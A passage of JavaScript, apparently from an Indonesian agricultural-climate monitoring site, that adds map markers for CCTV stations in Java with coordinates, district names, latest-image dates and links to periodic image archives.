                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=38' target='_blank'>Tikung </a><br> <b>Kec. :</b> Tikung, <b>Kab. :</b> Lamongan,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.1751986,112.3983688&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Thu, 13 April 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_terbaru.jpg' alt='Thu, 13 April 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_2017_04.gif' target='_blank'>Apr</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_2017_04_D1.gif' target='_blank'>Apr I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_2017_04_D2.gif' target='_blank'>Apr II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV38/periodic/balitklimat_CCTV38_2017_04_D3.gif' target='_blank'>Apr III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.3701558, 106.1986313)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Cibadak"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=16' target='_blank'>Cibadak </a><br> <b>Kec. :</b> Cibadak, <b>Kab. :</b> Lebak,<br> <b>PROV. Banten</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.3701558,106.1986313&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 27 June 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_terbaru.jpg' alt='Tue, 27 June 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_2017_06.gif' target='_blank'>Jun</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_2017_06_D1.gif' target='_blank'>Jun I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_2017_06_D2.gif' target='_blank'>Jun II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV16/periodic/balitklimat_CCTV16_2017_06_D3.gif' target='_blank'>Jun III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.0608292, 106.2623749)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Pontang"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=6' target='_blank'>Pontang </a><br> <b>Kec. :</b> Pontang, <b>Kab. :</b> Serang,<br> <b>PROV. Banten</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.0608292,106.2623749&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 22 May 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_terbaru.jpg' alt='Mon, 22 May 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_2017_05.gif' target='_blank'>May</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_2017_05_D1.gif' target='_blank'>May I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_2017_05_D2.gif' target='_blank'>May II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV06/periodic/balitklimat_CCTV06_2017_05_D3.gif' target='_blank'>May III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.32361111, 114.33436111)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Rogo Jampi"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=14' target='_blank'>Rogo Jampi </a><br> <b>Kec. :</b> Rogo Jampi, <b>Kab. :</b> Banyuwangi,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.32361111,114.33436111&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Wed, 09 November 2016<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_terbaru.jpg' alt='Wed, 09 November 2016' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_2016.gif' target='_blank'>2016</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_2016_11.gif' target='_blank'>Nov</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_2016_11_D1.gif' target='_blank'>Nov I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_2016_11_D2.gif' target='_blank'>Nov II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV14/periodic/balitklimat_CCTV14_2016_11_D3.gif' target='_blank'>Nov III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.90583333, 113.86072222)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Tenggarang"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=4' target='_blank'>Tenggarang </a><br> <b>Kec. :</b> Tenggarang, <b>Kab. :</b> Bondowoso,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.90583333,113.86072222&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 04 February 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_terbaru.jpg' alt='Mon, 04 February 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_2019_02.gif' target='_blank'>Feb</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_2019_02_D1.gif' target='_blank'>Feb I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_2019_02_D2.gif' target='_blank'>Feb II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV04/periodic/balitklimat_CCTV04_2019_02_D3.gif' target='_blank'>Feb III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.75702778, 112.54230556)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Kota Anyar"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=15' target='_blank'>Kota Anyar </a><br> <b>Kec. :</b> Kota Anyar, <b>Kab. :</b> Probolinggo,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.75702778,112.54230556&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 11 June 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_terbaru.jpg' alt='Mon, 11 June 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_2018_06.gif' target='_blank'>Jun</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_2018_06_D1.gif' target='_blank'>Jun I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_2018_06_D2.gif' target='_blank'>Jun II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV15/periodic/balitklimat_CCTV15_2018_06_D3.gif' target='_blank'>Jun III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.500699, 112.5141296)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Bangsal"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=13' target='_blank'>Bangsal </a><br> <b>Kec. :</b> Bangsal, <b>Kab. :</b> Mojokerto,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.500699,112.5141296&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Fri, 17 August 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_terbaru.jpg' alt='Fri, 17 August 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_2018_08.gif' target='_blank'>Aug</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_2018_08_D1.gif' target='_blank'>Aug I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_2018_08_D2.gif' target='_blank'>Aug II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV13/periodic/balitklimat_CCTV13_2018_08_D3.gif' target='_blank'>Aug III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.4070458, 111.3274918)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Kedunggalar"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=2' target='_blank'>Kedunggalar </a><br> <b>Kec. :</b> Kedunggalar, <b>Kab. :</b> Ngawi,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.4070458,111.3274918&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 26 December 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_terbaru.jpg' alt='Tue, 26 December 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_2017_12.gif' target='_blank'>Dec</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_2017_12_D1.gif' target='_blank'>Dec I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_2017_12_D2.gif' target='_blank'>Dec II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV02/periodic/balitklimat_CCTV02_2017_12_D3.gif' target='_blank'>Dec III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.1828132, 111.9931946)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Sumberrejo"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=5' target='_blank'>Sumberrejo </a><br> <b>Kec. :</b> Sumberrejo, <b>Kab. :</b> Bojonegoro,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.1828132,111.9931946&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Thu, 11 February 2016<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_terbaru.jpg' alt='Thu, 11 February 2016' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_2016.gif' target='_blank'>2016</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_2016_02.gif' target='_blank'>Feb</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_2016_02_D1.gif' target='_blank'>Feb I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_2016_02_D2.gif' target='_blank'>Feb II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV05/periodic/balitklimat_CCTV05_2016_02_D3.gif' target='_blank'>Feb III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.897091, 110.307341)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Pandak"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=42' target='_blank'>Pandak </a><br> <b>Kec. :</b> Pandak, <b>Kab. :</b> Bantul,<br> <b>PROV. Daerah Istimewa Yogyakarta</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.897091,110.307341&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 16 July 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_terbaru.jpg' alt='Tue, 16 July 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_2019_07.gif' target='_blank'>Jul</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_2019_07_D1.gif' target='_blank'>Jul I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_2019_07_D2.gif' target='_blank'>Jul II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV42/periodic/balitklimat_CCTV42_2019_07_D3.gif' target='_blank'>Jul III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.973322, 110.708369)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Ponjong"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=37' target='_blank'>Ponjong </a><br> <b>Kec. :</b> Ponjong, <b>Kab. :</b> Gunung Kidul,<br> <b>PROV. Daerah Istimewa Yogyakarta</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.973322,110.708369&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Wed, 01 May 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_terbaru.jpg' alt='Wed, 01 May 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_2019_05.gif' target='_blank'>May</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_2019_05_D1.gif' target='_blank'>May I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_2019_05_D2.gif' target='_blank'>May II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV37/periodic/balitklimat_CCTV37_2019_05_D3.gif' target='_blank'>May III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.7898488, 110.491188)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Prambanan"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=55' target='_blank'>Prambanan </a><br> <b>Kec. :</b> Prambanan, <b>Kab. :</b> Sleman,<br> <b>PROV. Daerah Istimewa Yogyakarta</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.7898488,110.491188&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 26 November 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_terbaru.jpg' alt='Mon, 26 November 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_2018_11.gif' target='_blank'>Nov</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_2018_11_D1.gif' target='_blank'>Nov I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_2018_11_D2.gif' target='_blank'>Nov II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV55/periodic/balitklimat_CCTV55_2018_11_D3.gif' target='_blank'>Nov III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.70433333, 112.10841667)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Papar"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=25' target='_blank'>Papar </a><br> <b>Kec. :</b> Papar, <b>Kab. :</b> Kediri,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.70433333,112.10841667&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 01 May 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_terbaru.jpg' alt='Tue, 01 May 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_2018_05.gif' target='_blank'>May</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_2018_05_D1.gif' target='_blank'>May I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_2018_05_D2.gif' target='_blank'>May II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV25/periodic/balitklimat_CCTV25_2018_05_D3.gif' target='_blank'>May III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.16569444, 112.57397222)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Kepanjen"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=10' target='_blank'>Kepanjen </a><br> <b>Kec. :</b> Kepanjen, <b>Kab. :</b> Malang,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.16569444,112.57397222&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Fri, 16 August 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_terbaru.jpg' alt='Fri, 16 August 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_2019_08.gif' target='_blank'>Aug</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_2019_08_D1.gif' target='_blank'>Aug I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_2019_08_D2.gif' target='_blank'>Aug II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV10/periodic/balitklimat_CCTV10_2019_08_D3.gif' target='_blank'>Aug III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.23786111, 113.52555556)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Banggal Sari"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=3' target='_blank'>Banggal Sari </a><br> <b>Kec. :</b> Banggal Sari, <b>Kab. :</b> jember,<br> <b>PROV. Jawa Timur</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.23786111,113.52555556&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 24 April 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_terbaru.jpg' alt='Tue, 24 April 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_2018_04.gif' target='_blank'>Apr</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_2018_04_D1.gif' target='_blank'>Apr I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_2018_04_D2.gif' target='_blank'>Apr II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV03/periodic/balitklimat_CCTV03_2018_04_D3.gif' target='_blank'>Apr III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.873058, 111.044163)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Tambakromo"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=23' target='_blank'>Tambakromo </a><br> <b>Kec. :</b> Tambakromo, <b>Kab. :</b> Pati,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.873058,111.044163&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sat, 03 August 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_terbaru.jpg' alt='Sat, 03 August 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_2019_08.gif' target='_blank'>Aug</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_2019_08_D1.gif' target='_blank'>Aug I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_2019_08_D2.gif' target='_blank'>Aug II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV23/periodic/balitklimat_CCTV23_2019_08_D3.gif' target='_blank'>Aug III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.89645, 109.4596)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Petarukan"
